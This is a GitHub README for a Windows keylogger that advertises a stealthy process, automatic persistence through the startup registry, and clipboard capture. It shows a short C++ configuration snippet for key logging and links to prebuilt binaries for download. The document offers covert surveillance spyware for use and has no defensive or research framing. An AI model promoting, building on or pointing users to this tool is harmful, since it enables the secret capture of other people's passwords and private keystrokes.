<div align="center">
    <a href="https://ci.appveyor.com/project/vim2meta/keylogger"><img src="https://ci.appveyor.com/api/projects/status/vny1d8cp1ge7lj0m?svg=true" alt="Build Status" /></a>
    <a href="https://www.codacy.com/app/vim2meta/Keylogger?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=vim2meta/Keylogger&amp;utm_campaign=Badge_Grade"><img src="https://api.codacy.com/project/badge/Grade/7e1530b50bb24332b13af43822ef0a9c" alt="Codacy Badge" /></a>
    <a href="https://github.com/vim2meta/Keylogger/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License" /></a>
    <a href="https://github.com/vim2meta/Keylogger/releases"><img src="https://img.shields.io/github/release/vim2meta/Keylogger.svg" alt="Release" /></a>
</div>

## Features
- Stealthy process
- Automically added to startup registry
- Keyboard locale support
- Special characters and numeric keypad
- Clipboard parsing on `Ctrl + V`

## Configuration
You may configure the name of the logging file as well as what should be logged for each [virtual-key code](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731.aspx) by changing the `configuration.h` file.
```cpp
constexpr const WCHAR* out_file{ L"filename.txt" };

const std::unordered_map<DWORD, const WCHAR*> key_codes
{
    { VK_DOWN, L"[DOWN ARROW]" },
    { VK_RETURN, L"\n" },
    { VK_ESCAPE, L"[ESCAPE]" },
    { VK_BACK, L"[BACKSPACE]" }
};
```

## Build
Visual Studio 2017 is required to load the solution. However, the project may be compiled by any Windows C++17 compiler. The required Windows libraries are `User32.lib` and `Advapi32.lib`. If you do not wish to build the project yourself, you may use the prebuilt binaries available here: https://github.com/vim2meta/Keylogger/releases.

## Contributing
All contributions are welcome. If you are going to submit a pull request, please follow the style of the project and aim for clear and concise code.
